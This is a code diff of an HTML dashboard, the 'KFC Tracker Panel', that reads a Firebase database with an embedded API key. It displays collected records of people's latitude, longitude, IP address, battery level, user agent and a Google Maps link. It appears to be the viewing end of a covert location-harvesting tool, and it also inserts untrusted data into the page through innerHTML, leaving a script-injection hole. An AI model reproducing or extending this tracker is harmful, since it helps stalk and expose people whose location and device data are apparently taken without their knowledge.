@@ -1,102 +1,83 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>KFC Panel - Location Monitor</title>
+  <meta charset="UTF-8">
+  <title>KFC Tracker Panel</title>
   <style>
     body {
-      margin: 0;
+      background: #000;
+      color: #0f0;
+      font-family: monospace;
       padding: 20px;
-      font-family: 'Segoe UI', sans-serif;
-      background-color: #0f0f0f;
-      color: #fff;
     }
-
-    h1 {
-      text-align: center;
-      color: #ff0000;
-      text-shadow: 0 0 10px red;
+    .entry {
+      border: 1px solid #0f0;
+      padding: 10px;
+      margin-bottom: 10px;
     }
-
-    #output {
-      margin-top: 20px;
-      display: flex;
-      flex-direction: column;
-      gap: 15px;
-    }
-
-    .card {
-      background: #1a1a1a;
-      border-left: 4px solid #ff0000;
-      padding: 15px;
-      border-radius: 8px;
-      box-shadow: 0 0 10px #ff000080;
-      animation: glow 2s infinite alternate;
-    }
-
-    .card a {
-      color: #00f7ff;
-      text-decoration: none;
-    }
-
-    @keyframes glow {
-      from {
-        box-shadow: 0 0 5px #ff000080;
-      }
-      to {
-        box-shadow: 0 0 15px #ff0000;
-      }
+    .entry a {
+      color: #0ff;
     }
   </style>
 </head>
 <body>
-  <h1>📍 KFC Location Panel</h1>
-  <div id="output">Loading...</div>
+  <h1>🔥 Live Location Panel 🔥</h1>
+  <div id="locationPanel">Loading...</div>
 
-  <!-- Firebase Compat Scripts -->
+  <!-- Firebase SDKs -->
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
 
   <script>
-    // 🔐 Replace this with YOUR actual config
-  const firebaseConfig = {
-  apiKey: "AIzaSyCG7XY_KjzJkfLWtUSgarDLritenEbbvSY",
-  authDomain: "kfc-tracker.firebaseapp.com",
-  databaseURL: "https://kfc-tracker-default-rtdb.firebaseio.com",
-  projectId: "kfc-tracker",
-  storageBucket: "kfc-tracker.firebasestorage.app",
-  messagingSenderId: "127099679000",
-  appId: "1:127099679000:web:4a4f5e66a5b99c63882e6d",
-  measurementId: "G-EPEXKK3S37"
-};
+    // Firebase Config
+    const firebaseConfig = {
+      apiKey: "AIzaSyCG7XY_KjzJkfLWtUSgarDLritenEbbvSY",
+      authDomain: "kfc-tracker.firebaseapp.com",
+      databaseURL: "https://kfc-tracker-default-rtdb.firebaseio.com",
+      projectId: "kfc-tracker",
+      storageBucket: "kfc-tracker.appspot.com",
+      messagingSenderId: "127099679000",
+      appId: "1:127099679000:web:4a4f5e66a5b99c63882e6d",
+      measurementId: "G-EPEXKK3S37"
+    };
 
-    // Initialize Firebase
+    // Init Firebase
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    // Listen to 'locations' node
+    const panel = document.getElementById("locationPanel");
     db.ref("locations").on("value", (snapshot) => {
       const data = snapshot.val();
-      const output = document.getElementById("output");
-      output.innerHTML = "";
+      panel.innerHTML = ""; // clear previous
 
       if (data) {
-        Object.values(data).reverse().forEach(entry => {
-          output.innerHTML += `
-            <div class="card">
-              📍 <b>Latitude:</b> ${entry.lat}<br>
-              📍 <b>Longitude:</b> ${entry.lon}<br>
-              🎯 <b>Accuracy:</b> ${entry.accuracy || "N/A"}m<br>
-              🌐 <b>IP:</b> ${entry.ip}<br>
-              🔋 <b>Battery:</b> ${entry.battery}<br>
-              🧠 <b>User Agent:</b> ${entry.userAgent}<br>
-              🗺️ <a href="https://www.google.com/maps?q=${entry.lat},${entry.lon}" target="_blank">Open in Google Maps</a>
+        const entries = Object.values(data).reverse(); // latest first
+        entries.forEach((entry, i) => {
+          const lat = entry.lat || "N/A";
+          const lon = entry.lon || "N/A";
+          const accuracy = entry.accuracy || "N/A";
+          const ip = entry.ip || "N/A";
+          const battery = entry.battery || "N/A";
+          const userAgent = entry.userAgent || "N/A";
+          const timestamp = entry.timestamp || "N/A";
+          const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+
+          panel.innerHTML += `
+            <div class="entry">
+              <b>#${i + 1}</b><br>
+              🗓️ <b>Time:</b> ${timestamp}<br>
+              📍 <b>Lat:</b> ${lat}<br>
+              📍 <b>Lon:</b> ${lon}<br>
+              🎯 <b>Accuracy:</b> ${accuracy} m<br>
+              🌐 <b>IP:</b> ${ip}<br>
+              🔋 <b>Battery:</b> ${battery}<br>
+              🧠 <b>User Agent:</b> ${userAgent}<br>
+              🌍 <a href="${mapsLink}" target="_blank">Open in Google Maps</a>
             </div>
           `;
         });
       } else {
-        output.innerHTML = "No data found.";
+        panel.innerHTML = "No data found.";
       }
     });
   </script>
